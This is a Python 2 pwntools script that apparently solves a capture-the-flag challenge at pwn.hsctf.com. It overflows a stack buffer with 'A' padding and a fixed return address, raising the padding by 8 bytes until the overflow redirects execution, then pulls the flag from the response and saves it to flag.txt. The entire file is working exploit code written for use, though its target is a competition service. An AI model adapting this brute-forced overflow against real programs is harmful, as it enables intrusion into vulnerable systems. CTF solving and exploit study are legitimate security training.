#!/usr/bin/python2
from pwn import *

paddingsize = 160
win = False

while win == False:
    conn = remote("pwn.hsctf.com", 5002)
    print conn.recvline()
    payload = 'A' * paddingsize + '\xd5\x11\x40\x00\x00\x00\x00\x00'
    conn.send(payload + '\n')
    print paddingsize
    print conn.recvline()
    try:
        flagline = conn.recvline()
        print flagline
        flag = flagline[flagline.index("flag{"):flagline.index("}") + 1]
    except:
        conn.close()
        paddingsize += 8
    else:
        win = True

f = open("flag.txt", "w")
f.write(flag)
f.close()

